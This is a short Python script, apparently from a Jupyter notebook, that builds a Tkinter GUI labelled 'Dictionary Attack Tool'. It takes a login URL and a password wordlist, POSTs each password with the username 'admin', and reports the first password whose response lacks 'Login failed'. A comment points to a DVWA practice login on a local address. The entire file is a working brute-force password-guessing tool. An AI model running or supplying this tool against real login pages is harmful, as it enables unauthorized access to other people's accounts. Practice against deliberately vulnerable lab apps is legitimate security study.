#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import tkinter
from tkinter import *
import requests

class DictionaryAtack(Tk):
    ChatLog = None
    entry1 = None
    entry2 = None
    
    def __init__(self):
        
        # Main window by calling the __init__ method of parent class Tk
        Tk.__init__(self)
        self.geometry("450x250")
        self.title("Dictionary Attack Tool")
        self.data = {"username": "admin", "password": "", "Login": "Login"}
        
        # URL
        url = Label(self, text="Enter URL",width=20,font=("bold", 10))
        url.place(x=80,y=10)
        self.entry1 = Entry(self)#http://192.168.0.7/dvwa/login.php
        self.entry1.place(x=220,y=10)

        # Password text file
        pswd = Label(self, text="Enter Password File",width=20,font=("bold", 10))
        pswd.place(x=68,y=50)
        self.entry2 = Entry(self)
        self.entry2.place(x=220,y=50)
        
        # Submit Buttton
        submit=Button(self, text='Submit',width=20,bg='grey',fg='white',command=self.main).place(x=150,y=200)
        
        # Output on screen
        self.ChatLog = Text(self, bd=0, bg="white", height="5", width="40", font="Arial",)
        self.ChatLog.place(x=45,y=90)
        
        self.mainloop()

    def atack(self):
        self.entry1 = self.entry1.get()
        self.entry2 = self.entry2.get()
        flag = 0
        with open(self.entry2, "r") as entry2:
            for line in entry2:
                word = line.strip()
                self.data["password"] = word
                response = requests.post(self.entry1, data=self.data)
                
                if "Login failed" not in str(response.content):
                    self.ChatLog.insert(INSERT,"\n\n Password found --> " + word)
                    flag =1
                    exit()
            if(flag==0):
                self.ChatLog.insert(INSERT,"\n\n\t    Oops! No password found.")

    def main(self):
        try:
            self.atack()
        except KeyboardInterrupt:
            exit()
            
if __name__ == '__main__':
    gui = DictionaryAtack()


# In[ ]:




